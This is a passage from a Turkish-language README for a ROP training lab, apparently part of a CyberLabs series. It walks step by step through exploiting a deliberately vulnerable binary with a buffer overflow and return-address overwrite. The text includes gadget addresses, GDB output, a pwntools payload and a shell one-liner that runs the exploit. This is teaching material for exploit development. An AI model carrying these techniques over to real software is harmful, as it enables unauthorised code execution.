# 0x0000000000401338 <+21>:	pop    %rbp
# 0x0000000000401339 <+22>:	ret
# YORUM: ❌ Bu sadece dummy fonksiyon! Gerçek pop rdi; ret yok.
#        Sadece push rbp, mov rsp,rbp, nop, pop rbp, ret yapıyor.

# 2. ADIM: ROPgadget ile gerçek gadget'ları bul
# Terminal'de çalıştır:
ROPgadget --binary compiled/vulnerable_code --ropchain
# ÇIKTI:
# pop rdi; ret: 0x401383
# pop rsi; ret: 0x40138c  
# pop rdx; ret: 0x401395
# syscall: 0x40139e

# 3. ADIM: Gerçek gadget'ları GDB'de incele
(gdb) x/5i 0x401383
# ÇIKTI:
# 0x401383: pop    %rdi
# 0x401384: ret
# YORUM: ✅ BU GERÇEK GADGET! RDI register'ına stack'ten değer alır.

(gdb) x/5i 0x40138c
# ÇIKTI:
# 0x40138c: pop    %rsi
# 0x40138d: ret
# YORUM: ✅ BU GERÇEK GADGET! RSI register'ına stack'ten değer alır.

(gdb) x/5i 0x401395
# ÇIKTI:
# 0x401395: pop    %rdx
# 0x401396: ret
# YORUM: ✅ BU GERÇEK GADGET! RDX register'ına stack'ten değer alır.

(gdb) x/5i 0x40139e
# ÇIKTI:
# 0x40139e: syscall
# YORUM: ✅ BU GERÇEK SYSCALL! Sistem çağrısı yapar.

# 4. ADIM: Gadget'ların kullanımını anla
# pop rdi; ret (0x401383): RDI'ya değer yükler (1. parametre)
# pop rsi; ret (0x40138c): RSI'ya değer yükler (2. parametre)  
# pop rdx; ret (0x401395): RDX'ya değer yükler (3. parametre)
# syscall (0x40139e): Sistem çağrısı yapar

# 5. ADIM: Gadget chain örneği
# Eğer system("whoami") çağırmak istiyorsak:
# 1. pop rdi; ret (0x401383) -> RDI'ya "whoami" string adresini yükle
# 2. system@plt (0x401030) -> system fonksiyonunu çağır
# 3. exit@plt (0x401060) -> Programı sonlandır
```

#### 3.3. Hedef Fonksiyon Analizi - Detaylı İnceleme
```bash
# 1. ADIM: execute_whoami fonksiyonunu detaylı incele
(gdb) disassemble execute_whoami
# ÇIKTI:
# 0x0000000000401220 <+0>:	push   %rbp
# 0x0000000000401221 <+1>:	mov    %rsp,%rbp
# 0x0000000000401224 <+4>:	sub    $0x10,%rsp
# 0x0000000000401228 <+8>:	lea    0xe89(%rip),%rax        # 0x4020b8
# 0x000000000040122f <+15>:	mov    %rax,%rsi
# 0x0000000000401232 <+18>:	lea    0x2e07(%rip),%rax        # 0x404040 <_ZSt4cout@GLIBCXX_3.4>
# 0x0000000000401239 <+25>:	mov    %rax,%rdi
# 0x000000000040123c <+28>:	call   0x401040 <_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@plt>
# 0x000000000040127e <+94>:	lea    0xe7d(%rip),%rax        # 0x402102
# 0x0000000000401285 <+101>:	mov    %rax,%rdi
# 0x0000000000401288 <+104>:	call   0x401030 <system@plt>
# 0x0000000000401319 <+249>:	mov    $0x0,%edi
# 0x000000000040131e <+254>:	call   0x401060 <exit@plt>

# YORUM: ✅ MÜKEMMEL! Bu fonksiyon:
# - 0x401288: system("whoami") çağırır
# - 0x40131e: exit(0) ile programı sonlandırır
# - Bu yüzden sadece return address'i bu fonksiyonla değiştirmek yeterli!

# 2. ADIM: String adreslerini bul
(gdb) x/s 0x4020b8
# ÇIKTI: 0x4020b8: "Shellcode Enjeksiyonu Basarili!"
# YORUM: Bu mesaj yazdırılacak

(gdb) x/s 0x402102
# ÇIKTI: 0x402102: "whoami"
# YORUM: Bu string system() fonksiyonuna parametre olarak geçilecek

# 3. ADIM: win_function'ı incele
(gdb) disassemble win_function
# ÇIKTI:
# 0x0000000000401166 <+0>:	push   %rbp
# 0x0000000000401167 <+1>:	mov    %rsp,%rbp
# 0x0000000000401216 <+176>:	mov    $0x0,%edi
# 0x000000000040121b <+181>:	call   0x401060 <exit@plt>

# YORUM: ❌ Bu fonksiyon sadece mesaj yazdırır, komut çalıştırmaz.
#        execute_whoami daha iyi çünkü gerçek komut çalıştırır.

# 4. ADIM: Fonksiyon adreslerini doğrula
(gdb) x/gx execute_whoami
# ÇIKTI: 0x401220: 0x0000000000401220
# YORUM: ✅ execute_whoami adresi 0x401220

(gdb) x/gx win_function
# ÇIKTI: 0x401166: 0x0000000000401166
# YORUM: ✅ win_function adresi 0x401166

# 5. ADIM: Hangi fonksiyonu kullanacağımızı belirle
# execute_whoami (0x401220) - ÖNERİLEN:
# ✅ system("whoami") çağırır
# ✅ Gerçek komut çalıştırır
# ✅ Kullanıcı adını gösterir
# ✅ Programı düzgün sonlandırır

# win_function (0x401166) - ALTERNATİF:
# ❌ Sadece mesaj yazdırır
# ❌ Komut çalıştırmaz
# ✅ Programı düzgün sonlandırır
```

#### 3.4. Exploit Stratejisi - Detaylı Açıklama
```bash
# STRATEJİ 1: Basit ROP Chain (ÖNERİLEN - Kolay)
# 1. ADIM: Buffer overflow (72 bytes)
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 2. ADIM: Return address'i execute_whoami ile değiştir
# \x20\x12\x40\x00\x00\x00\x00\x00
# 3. ADIM: execute_whoami otomatik olarak system("whoami") çağırır

# NEDEN BU STRATEJİ DAHA İYİ:
# ✅ Sadece 2 adım: Buffer overflow + Return address değiştirme
# ✅ execute_whoami zaten system("whoami") çağırıyor
# ✅ execute_whoami zaten exit(0) yapıyor
# ✅ Ekstra gadget gerekmez
# ✅ Daha az hata yapma riski

# STRATEJİ 2: Gelişmiş ROP Chain (Alternatif - Zor)
# 1. ADIM: Buffer overflow (72 bytes)
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 2. ADIM: pop rdi; ret gadget (0x401383)
# \x83\x13\x40\x00\x00\x00\x00\x00
# 3. ADIM: "whoami" string adresi (0x402102)
# \x02\x21\x40\x00\x00\x00\x00\x00
# 4. ADIM: system@plt adresi (0x401030)
# \x30\x10\x40\x00\x00\x00\x00\x00
# 5. ADIM: exit@plt adresi (0x401060)
# \x60\x10\x40\x00\x00\x00\x00\x00

# NEDEN BU STRATEJİ DAHA ZOR:
# ❌ 5 adım gerekiyor
# ❌ String adresini bulmak gerekiyor
# ❌ PLT adreslerini bulmak gerekiyor
# ❌ Daha fazla hata yapma riski
# ❌ Daha karmaşık

# HANGİ STRATEJİYİ SEÇMELİYİM?
# Eğer sadece whoami komutunu çalıştırmak istiyorsan: STRATEJİ 1
# Eğer ROP chain öğrenmek istiyorsan: STRATEJİ 2
# Eğer gerçek dünyada farklı komutlar çalıştırmak istiyorsan: STRATEJİ 2
```

#### 3.5. Zafiyet Doğrulama - Adım Adım Test
```bash
# 1. ADIM: execute_whoami'de breakpoint koy
(gdb) break execute_whoami
# ÇIKTI: Breakpoint 1 at 0x401220
# YORUM: ✅ Breakpoint başarıyla koyuldu

# 2. ADIM: Programı çalıştır
(gdb) run
# ÇIKTI: 
# === CyberLabs ROP Vulnerability Laboratory ===
# Modul: Return-Oriented Programming Exploitation
# Seviye: Ileri
# ROP Vulnerability Lab - Buffer Overflow
# =======================================
# Giris yapin: 
# YORUM: ✅ Program çalışıyor, payload bekliyor

# 3. ADIM: Payload'ı gir
# Payload: 72 byte 'A' + execute_whoami adresi
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00

# 4. ADIM: Stack durumunu kontrol et
(gdb) x/32gx $rsp
# ÇIKTI ÖRNEĞİ:
# 0x7fffffffe000: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe010: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe020: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe030: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe040: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe050: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe060: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe070: 0x4141414141414141  0x4141414141414141
# 0x7fffffffe080: 0x4141414141414141  0x0000000000401220
# YORUM: ✅ Buffer overflow başarılı! Return address 0x401220 (execute_whoami) oldu

# 5. ADIM: Return address'i doğrula
(gdb) x/gx $rsp+0x48
# ÇIKTI: 0x7fffffffe048: 0x0000000000401220
# YORUM: ✅ MÜKEMMEL! Return address execute_whoami ile değişti

# 6. ADIM: execute_whoami'ye geçiş yap
(gdb) stepi
# ÇIKTI: Breakpoint 1, execute_whoami () at vulnerable_code.cpp:45
# YORUM: ✅ BAŞARILI! execute_whoami fonksiyonu çağrıldı

# 7. ADIM: Fonksiyonun çalışmasını izle
(gdb) continue
# ÇIKTI:
# Shellcode Enjeksiyonu Basarili!
# 'whoami' komutu calistiriliyor...
# === WHOAMI KOMUTU CIKTISI ===
# alicangonullu
# =============================
# Komut basariyla calistirildi!
# ROP ile sistem komutu basariyla enjekte edildi!
# YORUM: ✅ MÜKEMMEL! Exploit tamamen başarılı!

# 8. ADIM: Program sonucunu kontrol et
# Program exit(0) ile sonlandı
# YORUM: ✅ Program düzgün sonlandı

# SONUÇ DEĞERLENDİRMESİ:
# ✅ Buffer overflow başarılı
# ✅ Return address değişimi başarılı  
# ✅ execute_whoami çağrısı başarılı
# ✅ system("whoami") çalıştırma başarılı
# ✅ Kullanıcı adı gösterildi (alicangonullu)
# ✅ Program düzgün sonlandı
# ✅ ROP exploit tamamen başarılı!
```

### 4. ROP Chain Oluşturma

#### Linux x86_64 için:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain - sadece execute_whoami fonksiyonunu çağır
payload += p64(0x401220)        # execute_whoami fonksiyonu

# Alternatif: Gerçek ROP chain (gelişmiş)
# payload += p64(0x401383)        # pop rdi; ret
# payload += p64(0x0)             # rdi değeri
# payload += p64(0x40138c)        # pop rsi; ret  
# payload += p64(0x0)             # rsi değeri
# payload += p64(0x401395)        # pop rdx; ret
# payload += p64(0x0)             # rdx değeri
# payload += p64(0x40139e)        # syscall
# payload += p64(0x401220)        # execute_whoami fonksiyonu
```

#### macOS ARM64 için:
```python
# Buffer overflow (64 bytes) + Return address overwrite (8 bytes)
payload = b"A" * 72

# Basit ROP chain (ARM64 farklı)
payload += p64(whoami_addr)     # execute_whoami fonksiyonu
```

### 3. Exploit Çalıştırma

```bash
# Exploit'i çalıştır
python3 source_code/exploit.py

# Manuel test (Linux x86_64)
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x20\x12\x40\x00\x00\x00\x00\x00" | ./compiled/vulnerable_code

# ROPgadget ile gadget'ları bul
ROPgadget --binary compiled/vulnerable_code --ropchain

# Belirli gadget'ları ara
objdump -d compiled/vulnerable_code | grep -E "(pop rdi|pop rsi|pop rdx|syscall)"
```

### 4. Beklenen Sonuç

```
Shellcode Enjeksiyonu Basarili!
'whoami' komutu calistiriliyor...
[kullanici_adi]
Komut basariyla calistirildi!

ROP ile sistem komutu basariyla enjekte edildi!
```

## İleri Seviye Konular

- **ASLR Bypass:** Information leak ile ASLR'ı aşma
- **Stack Pivot:** Stack pointer'ı manipüle etme
- **JOP (Jump-Oriented Programming):** ROP'un alternatifi
- **COP (Call-Oriented Programming):** Call instruction'ları kullanma
- **ROP Chain Optimization:** Daha verimli chain'ler oluşturma

## Kaynaklar

- [ROP Emporium](https://ropemporium.com/) - ROP öğrenme platformu
- [Phrack ROP Article](http://phrack.org/issues/58/4.html) - ROP'un temel makalesi
- [ROPgadget Documentation](https://github.com/JonathanSalwan/ROPgadget) - Gadget analiz aracı
- [pwntools Documentation](https://docs.pwntools.com/) - Exploit geliştirme kütüphanesi

## Katkıda Bulunma

Bu laboratuvarı geliştirmek için:
1. Fork yapın
2. Yeni özellik ekleyin
3. Pull request gönderin

## Lisans

Bu proje MIT lisansı altında lisanslanmıştır.

## İletişim

- **CyberLabs:** [GitHub](https://github.com/alicangonullu/CyberLabs)
- **E-posta:** alicangonullu@yahoo.com
- **Web:** https://alicangonullu.com
